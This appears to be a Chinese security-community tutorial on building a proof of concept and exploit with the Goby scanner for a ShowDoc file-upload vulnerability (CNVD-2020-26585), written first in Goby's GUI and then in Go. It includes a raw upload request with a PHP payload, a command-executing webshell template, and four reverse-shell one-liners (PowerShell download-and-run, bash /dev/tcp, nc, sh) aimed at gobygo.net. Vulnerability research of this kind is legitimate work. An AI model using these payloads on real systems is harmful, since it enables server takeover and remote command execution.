> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/koxjh1NNDr9u1Es0h6coiQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjLTMIjhRPrloPMpJ4nXfwsIjLDB23mjUrGc3G8Qwo770yYCQAnyVhPGKiaSgfVu0HKnfhT4v5hSWcQ/640?wx_fmt=gif)  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajgQV73zqgAv38eJlZP1qoYTZIWsRkCaqyHPhw5HBVXhjD0YW8icMSibEA/640?wx_fmt=png)

Goby 社区第 16 篇技术分享文章

全文共：7495 字   预计阅读时间：19 分钟

**前言：**

**上篇＞＞**一个文件上传 1day 的 PoC 编写，从简单的 GUI 编写，不满足于是选择用 Go 语言编写，再到逐个使用 Goby 自带 API 优化 PoC，最终实现一键反弹 shell。不仅学习了 Go，也对 EXP 进一步的完善。

下篇＞＞代码审计，从一个为什么产生出发，不断地问自己问题，虽然是一次简单的代审，延伸出一次溯源，最后的收获远不止一次代码审计，而是学习方法！

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **01**  

**准备工作**

**1.1 漏洞速览**

漏洞描述：Showdoc 存在文件上传漏洞，攻击者可以利用漏洞获取服务器权限。

漏洞影响：ShowDoc < V2.8.3

漏洞参考：https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585

**1.2 环境搭建**

系统：Windows10

工具：PHPStudy2016，VScode，Goby，Burp

环境：showdoc-V2.6.7  https://github.com/star7th/showdoc

**1.3 PoC**

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 127.0.0.1:81
Content-Type: multipart/form-data; boundary=---------------------------346031065719027724703329952952
Content-Length: 252
Connection: close

-----------------------------346031065719027724703329952952
Content-Disposition: form-data; 
Content-Type: text/plain

<?php phpinfo();?>
-----------------------------346031065719027724703329952952--
```

**1.4 复现**

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajF0EXWZXhMYGzDsXvtwdAmMPYYhkqzroh3icWHEicF1cjKgPmMtJRbukA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **02**

**利用 Goby 的 GUI 编写 PoC&EXP**

**2.1 编写 PoC**  

### **2.1.1 填入基本内容**

可以手动输入，但是由于该漏洞有 CNVD 编号，于是考虑从命令行导入

```
//在goby的golib目录下的goby-cmd文件，也可以-h解锁更多操作
goby-cmd -mode genpoc -CNVDID CNVD-2020-26585 -exportFile exploits\user\CNVD-export.go
//导出文件在goby的\golib\exploits\user目录下
```

已知 BUG：

1.  通过命令行导出的文件需要手动加上指纹：`"GobyQuery": "app=\"showDoc\""`，才可以导入进 Goby，不然导入不进去，会报错（在 log 中可以看到报错信息）
    
2.  通过命令行导出的文件导入 PoC 时，测试界面会出现白屏 bug，因为 ScanSteps 中缺少 `"SetVariable": []` 字段，添加即可。
    

> 不想拘泥于手动，虽然导入遇到了不少的麻烦，但是总归是需要尝试的，相信后续 Goby 团队会改进的。

### **2.1.2 发出请求**

简单的将 PoC 内容复制粘贴进对应字段即可  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGaj0ISiboFBH0VeAs3pmaQ1Qmpic48IySGbXw3WtjBMkQkpiblX5Nibqsd2qw/640?wx_fmt=png)

### **2.1.3 验证响应**

参考 Goby《PoC writing suggestions》https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions 中的准确性：增加检测关键字、特殊符号、响应包中独一无二的特征，以提高其准确性。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGaj8WPoZVsUhKqJiapHeSexuw9ZzAJyGArVLEU0wt1mDvplE8Kh6CiawTBg/640?wx_fmt=png)

### **2.1.4 编写 PoC 的 Tips**

1.  修改 PoC 之后记得保存后，再进行单 IP 测试
    
2.  由于 Goby 可能因为缓存等机制，导致修改 PoC 并保存之后，即使发包也是未修改之前的包，需要返回漏洞管理界面再重新载入 PoC
    
3.  由于上述载入载出步骤较为麻烦，我采用 Goby 脚手架的方式，在 VSCode 修改代码的同时在 CMD 中测试：`goby-cmd -mode runpoc -operation scan -pocFile exploits\user\a.go -target 127.0.0.1`
    
    > Goby 脚手架可参考：https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide
    
4.  脚手架的方式不支持 burp 代理调试。如果需要对 PoC 进行代理调试的话，推荐依然使用 GUI 的方法，详见 @HuaiNian 师傅的[《Json 编写 PoC&EXP 遇到的那些坑》](https://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247502011&idx=1&sn=7afd286e7b17082a6398457be5a66154&scene=21#wechat_redirect)
    

**2.2 编写 EXP**
--------------

总体思路同上 PoC 的问题，只不过将上传的验证性文件切换为一句话、菜刀等类型木马文件，然后在浏览器中访问对应连接即可。

仔细查看官方文档的 EXP 部分 ，实际操作步骤如下：

> https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%BC%96%E5%86%99

1.  将`HasExp`字段设置为 true
    
2.  在 PoC 界面编写 EXP 后，在编辑器中将`ScanSteps`对应代码复制粘贴到`ExploitSteps`
    
3.  上传文件内容更改为冰蝎马
    
4.  直接将返回的链接扔到冰蝎里面链接即可。上传一句话木马同理
    

已知问题：

1.  Goby GUI 目前暂不支持 EXP 用 GUI 编写，借用 PoC 界面编写后，在编辑器中将`ScanSteps`对应代码复制粘贴到`ExploitSteps`
    
2.  抓包问题：pcap 模式扫描 127.0.0.1 无 IP 存活，但是 socket 模式下可以扫 127.0.0.1
    

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajw3GB1FaAAzPsoJ4gTbxab7sBjcb4HS8rOrriaehwcm3wcrGeHibzibhibA/640?wx_fmt=png)

**2.3 进一步优化 POC&EXP**
---------------------

### **2.2.1 自动删除上传文件**

在公网测试的时候，发现一个很不好的现象：某站点上存在大量这类一句话木马。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajGibXE3kjgYJsN5kYh0qvt5BKkrU28x2H2HcLickV7TI6lEcAms6dibl8g/640?wx_fmt=png)

参考 Goby《PoC writing suggestions》: https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions 的无害性：我们需要将上传的文件进行删除。虽然第一次第二次很麻烦，但是优秀是需要形成习惯的。

问题：

1.  如何删除上传文件？PHP 中可以利用`unlink()`函数来删除文件
    
2.  如何触发`unlink()`函数？连续发出两次请求。第一次请求用于上传文件，第二次请求用于触发`unlink()`函数删除文件
    
3.  如何获取第二次请求的链接？第一次的返回包中有返回绝对路径，且 Goby 可以基于正则提取第一次请求的响应，并在第二次利用。
    
    > 详见 Goby《POC 编写指南之 JSON 录入漏洞逻辑手册》：https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide
    
4.  如何编写正则？先百度正则语法，再用 regex101 平台进行测试
    
5.  如何去掉链接 /\ 这些符号？化繁为简，分析文件路径组成：Hostinfo+Public/Uploads + 日期 + 随机文件名，后两个变量分两次正则提取，然后整体拼接即可
    

问题解决了，步骤自然清晰：

1.  在上传的文件末尾增加`unlink()`函数
    
2.  在第一次请求的正则部分增加自定义变量`date`和`file`
    
3.  在 Goby 中添加第二次请求的 URL 中使用这两个变量`/Public/Uploads/{{{date}}}/{{{file}}}`
    
4.  如果第二次响应为 200 即可算作成功
    

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajxCaDzo8bhJicicck5PLicUISH8D0TwBNPnBjylGBJm0AmKsvQcSXjdkJw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajWUicn4iaXQXuttFqfnPfIo8wFQicpGBX8UjxMYLl7h5bp8AJhG8TwVbQQ/640?wx_fmt=png)

### **2.2.2 提高 PoC 的准确性**

问题：既然可以发出第二次请求，不仅可以触发`unlink()`函数，是否可以考虑增加一些`echo`操作进一步提高 PoC 的准确性？

思路：在 php 文件中 echo 一段随机数，然后第二次请求在响应判断的时候，不仅只是判断响应为 200，也匹配是否这段随机数？

问题解决了，步骤自然清晰。虽然第一次返回匹配到 success 等字段即可验证 PoC 成功，第二步 echo 再一下有些多余，但是我想以后某个地方会用的，先学着。

已知问题：由于目前 Goby GUI 并不支持随机数，所以只能手动输入一个固定数然后进行判断。(Goby 团队后续会在 GUI 中增加随机数选项)

### **2.2.3 优化一句话木马**

**新需求：**上传冰蝎类的马简单，上传一句话木马类似，但是之前的方式需要在浏览器或冰蝎中打开链接进行操作，有些繁琐。针对一句话木马如果只想在 GobyGUI 中操作，不需要新打开浏览器中转，肯定更优雅更简洁，那么如何操作？

**需求拆解：**实现动态一句话木马：① 在木马文件中动态插入一句话命令; ② 触发木马文件并获取返回值

问题：

1.  如何在上传文件中动态插入参数？查看文档后发现：Goby 提供`ExpParams`字段来让用户自定义所需传递参数，且和自定义参数逻辑一样，`{{{}}}`包裹即可在 json 任意位置使用该变量，比如`<?php system("{{{cmd}}}");unlink(); ?>`, 即可实现一句话木马的操作
    
2.  如何触发木马并返回值？和前面类似，发送二次请求即可
    

Trick：

1.  Goby 发包逻辑是每次先 POC 后 EXP，更改 EXP 后又要重新走一遍扫描流程，很麻烦，有其他直接验证 EXP 的操作吗？Goby-cmd.exe 脚手架中不仅提供 scan 操作，也提供 exploit 操作，且 exploit 操作支持`-params '{"cmd":"whoami"}'`参数。
    
2.  输入命令`goby-cmd -mode runpoc -operation exploit -pocFile exploits\user\a.go -target 127.0.0.1 -params "{\"cmd\":\"whoami\"}"`即可直接验证 EXP。
    
3.  在 cmd 模式下验证 EXP 无误，切换到 GUI 界面进行扫描，EXP 验证成功！
    

已知 BUG：

1.  发包 BUG：在 json 编写 EXP 需要连续发两个包的情况下，即使内容编写正确的情况下依然可能会检测失败。需要在 ExploitSteps 的第一个请求的`SetVariable`键中额外加入`"output|lastbody"`值，才会成功执行第二个请求，进而检测成功。（前面《自动删除上传文件》部分用的仅仅只有 PoC，没用到 EXP 这一步，所以未产生 BUG）
    
2.  系统差异 BUG：windows 下 cmd 中使用`-params '{"cmd":"whoami"}'` 参数会报错`invalid character '\'' looking for beginning of value` ，改为`"{\"cmd\":\"whoami\"}"`即可
    

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajzDLZjIyXdqE2BT5PJEFyPUsnE4ajVArvlL0VF6bZYU4UKsTgrsvApw/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajBbnibnc6ugPClnlC4G8dJeicqv8QHdDJx7qicbMgnsUfibjSQaEibiaEic0Sg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **03**

**学习用 Go 语言编写 Goby 的 PoC**

**3.1 迈出第一步：用 GO 编写 PoC**
-------------------------

使用 GUI 时遇到的痛点

1.  部分功能缺失：无法使用随机数
    
2.  缺少 DIY 需求：对于返回的`\/Public\/Uploads\/2021-06-24\/`这类链接无法直接使用，需要手动剔除转移符号
    
3.  黑盒的未知性：单纯看 json 并不能掌控 PoC 后续是怎么被载入和利用的，没有 Go 代码看起来的直观可控
    
4.  BUG：不少 bug 是因为 json 中缺少某个键值，但是判断又很难判断，而 Go 代码更加可控。
    

困难：

1.  上述 Poc 难吗？不难，不过是发出请求罢了。
    
2.  不会 Go 语言怎么办？只是发出一个请求罢了，官方也提供了 code demo，只需要改下 URI 即可完成轮子搭建。
    
    > 详见 Goby《Vulnerability-writing-guide》之 golang - 代码录入漏洞手册 https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide
    

虽然我不会 Go，但是因为上面的痛点，还是想迈出那第一步。

思路：

1.  化繁为简：先写 PoC，PoC 写好了，EXP 自然写好了。
    
2.  根据官方的 demo，改下 POC 中的 Uri，改下匹配的关键字
    
3.  测试即可
    

具体不表，造轮子而已。

**3.2 进一步：优化 PoC**
------------------

### **3.2.1 用 Go 语言实现高级需求**

刚才只是简单的 request，需要完成更高的需求，比如前面对 POC 的优化

问题：

1.  Go 如何实现两次请求达到删除的效果？把发出请求的代码 Copy 一次，if 第一次成功，发出第二次请求，if 第二次请求成功，return true。
    
2.  Go 如何使用正则？仔细看官方文档《漏洞编写指南》 ，发现其使用了`regexp.MustCompile()` ，百度搜用法，先新建 regex.go 文件本地测试，熟悉用法后写入 PoC 测试
    
3.  Go 如何拼接变量？仔细看官方文档《漏洞编写指南》 ，发现其使用了`fmt.Sprintf("%s",var）` ，百度搜用法，先新建 fmt.go 文件本地测试，熟悉用法后写入 POC 测试
    
4.  Go 如何实现随机数？因为前面 GUI 编写只能固定数，存在被检测特征，仔细看官方文档《漏洞编写指南》 ，发现其使用`RandomHexString()`生成随机字符串，将固定数替换为随机数变量即可
    
5.  Go 能否将冰蝎上传后返回链接自动优化，而不是手动删除转义符号？既然我们可以通过拼接`date`和`file` 形成第二次请求的链接，那么我们也可以冰蝎的输出的内容改为这个链接：`expResult.Output =fmt.Sprintf("%s/Public/Uploads/%s/%s", expResult.HostInfo, date[1], file[1])`
    
6.  Go 能否进一步减少 PoC 特征？前面提及不少网上木马的 key 为`peiqi` , 此处也可以利用`RandomHexString()`的方式随机生成 key，然后在第二次使用后删除该文件，实现一次一密的效果。当然`boundary=-------xxxxx`字段也可以通过`RandomHexString()`来实现随机性。
    
    > 《漏洞编写指南》：https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide
    

一步步的查看文档、测试，发现 Go 语言编写 PoC&EXP 时，内容和行为更可控，也能实现更多自定义需求，需要的 Go 语言基础也不高，个人觉得比目前 GUI 的 Json 编写更加方便。（也相信后续 Goby 团队会改进 GUI 并实现这些需求）

### **3.2.2 执行一句话命令**

Goby 红队版本就是执行一句话回显命令，问题：

1.  Goby 如何自定义参数？前面已经介绍了，在 json 中的`ExpParams`字段来让用户自定义所需传递参数
    
2.  Go 中如何获取到自定义参数? 查看文档发现，可以使用`ss.Params["cmd"].(string)`的形式获取参数
    
3.  Go 中如何将自定义参数输入到 payload 中？利用前面提及的`fmt.Sprintf("%s",var）`方式
    

### **3.2.3 更进一步：直接反弹 shell**

**想法：**既然可以一句话木马，而大部分时间我们生成一句话木马之后第二步就是反弹 shell，那么为什么第二次不直接执行反弹 shell，难道不比执行一句话命令好？

问题：

1.  如何实现（思路上）？将一句话木马的 paylod 部分由自定义参数命令的方式直接改为反弹 shell 的命令
    
2.  如何实现（实际操作）？查看 Goby 提供反弹 shell 的 demo 文档，然后魔改为自己需要的即可
    
    > https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-goby-%E7%9A%84-godserver-%E5%8F%8D%E5%BC%B9-shell
    
3.  为什么可以反弹 shell，但是所上传文件无法自动删除，`unlink()`函数没触发？因为先执行命令再执行`unlink()`函数，而前者 shell 在反弹过程中堵塞的进程，百度后发现可采取 popen() 启动子进程的方式。(有趣的是，通过该文档，我了解到可以通过`php_uname()`来判断服务器主机系统，进而根据不同系统动态生成 payload 的操作)（GobyShell 只有 10 分钟存活，也可以保证不会长期驻留服务器进程）
    

> 和 @go0p 师傅交流之后，我发现我的想法是错的：我急于直接看到反弹 shell 的效果，只是因为我的测试环境允许。在实战情况下，目标可能不出网，Godserver 服务器可能有一定的问题等等导致反弹 shell。不一定在所有环境下都是 OK 的，所以应该是目标能使用回显就回显，其次才是其他验证方式。
> 
> 参考《GobyPOC 编写建议之其他建议》：https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AE%AE

```
//Goby生成的godserver相关命令
//ReverseTCPByPowershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://gobygo.net/ps/rs.ps1');rs -H gobygo.net -P 35355
//ReverseTCPByBash
bash -i >& /dev/tcp/gobygo.net/35355 0>&1
//ReverseTCPByNcBsd
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc gobygo.net 35355 >/tmp/f
//ReverseTCPBySh
0<&1-;exec 1<>/dev/tcp/gobygo.net/35355;sh -i <&1 >&1 2>&1
```

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajllRlAvhuMoyWto4H6FudnIkgxJM2pceia9T7vDmS9nGv61Zd9xrVbQA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJ4l1LHCGgS2vtwUic6ufGajFrSciasibHtommGPUUiaG7XJ5EFqCDOZYdicwMlMG4XYM3hKmIgfaG3wMw/640?wx_fmt=png)

**3.3 最终效果**
------------

代码放在仓库：https://github.com/corp0ra1/showDocDemo

**3.4 发散思维**
------------

上述操作基本把 Goby 提供的功能基本都尝试了个遍，就剩下个 DNSLOG 也尝试一下？比如第二次请求之后不通过返回值判断而是根据 DNSLOG 的结果？

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **04**

**更进一步 - 代码审计**

上述操作只是完成了漏洞的复现，以及 PoC&EXP 的编写，但是心中还是有疑问

*   为什么文件名中里面有`.<>php`的畸形后缀就可以绕过?
    
*   为什么我尝试`.<php`的后缀绕过方式不行？
    
*   为什么有这种神奇的绕过方法？
    
*   什么原因导致的？
    

十万个为什么，最终促使了我进行代码审计！

> 代码审计很简单，但是还有更有趣的溯源过程，详见下篇

  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWfiaAtUngV8rgLh0bIibv9SumD1Y9ZmphGxK9lKiakkOWDp2gRsLjZInPg/640?wx_fmt=png)

**最新 Goby 使用技巧分享****：**

[• bytesec | 从致远 OA-ajax.do 漏洞复现到利用](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247493690&idx=1&sn=b1ddaa1b3ca1004cf3bf336f8f4c2eb4&chksm=eb84039adcf38a8c012a29829cda76766bb925bd6a0d80687bc43b597f70f64046158fe0ca41&scene=21#wechat_redirect)  

[• zzlyzq | 利用 Goby 发现企业云网络中的安全隐患](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247495973&idx=1&sn=45fbd8de0e1377d2912d5f9c808bbb03&chksm=eb841a85dcf393933fcbc6e5d718c91355ad274cd0ae1ce634e6b4ab94037fa1218fa5b4f4bb&scene=21#wechat_redirect)

[• zhzyker | 如何编写合格的 PoC 领取 Goby 红队专版](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247500193&idx=1&sn=217ab617e2160f99aa2cd43f4511f4ab&chksm=eb842a01dcf3a317186bacce650fa231a109a805a8778fcd4b3a2379a3dbcea5adcfc92af7da&scene=21#wechat_redirect)

[•](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247491982&idx=1&sn=32af9069f2cc46ca4e976949bf59fb9b&chksm=eb840a2edcf38338aa47e684a294e3adb420fa79c1fbabe890344ab6d04f1e9fbb71a6d1824e&scene=21#wechat_redirect) [HuaiNian | Json 编写 PoC&EXP 遇到的那些坑](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247502011&idx=1&sn=7afd286e7b17082a6398457be5a66154&chksm=eb84231bdcf3aa0d8aba5939b0a357ecc87f2ccc5b13887e9bfc0d5e823504992423d5b72c16&scene=21#wechat_redirect)

[• PeiQi | 快速上手 Golang 编写 PoC&EXP](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247502934&idx=1&sn=f1e313e2e42bd7b31f088062eb73669b&chksm=eb8427f6dcf3aee0d09e2ed50775cc75c66ec47112e95e73595eb1d0970d87e8fef77056bff3&scene=21#wechat_redirect)

更多 >>  打野手册

如果表哥 / 表姐也想把自己上交给社区（Goby 介绍 / 扫描 / 口令爆破 / 漏洞利用 / 插件开发 / PoC 编写等文章均可）![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKEYyZh6YMicl2K5TDD26xJiaXMwReBoEFfWYSRkOGBMzrZ3VpbKu1DtFLprCibCrsuX3QlGJLMG79jg/640?wx_fmt=png)，欢迎投稿到我们公众号，红队专版等着你们~~~

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjIaeEP9ZkuBRxk7BicMlGFoEZnkVh7ib8GaBYw8lrh8SqACnTUZXlXclC9ZRfOFuvB3gTWHOPvH8icyg/640?wx_fmt=png)